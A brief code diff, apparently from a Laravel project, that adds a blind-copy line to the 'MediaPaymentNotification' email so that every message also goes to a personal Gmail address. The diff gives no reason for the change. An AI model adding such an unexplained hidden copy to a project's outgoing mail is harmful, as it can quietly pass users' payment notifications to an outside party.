@@ -32,6 +32,7 @@ class MediaPaymentNotification extends Mailable
     public function build()
     {
         return $this->markdown('mail.MediaPaymentNotification')
+            ->bcc('kokrokoos08@gmail.com')
             ->subject('New Campaign');
     }
 }
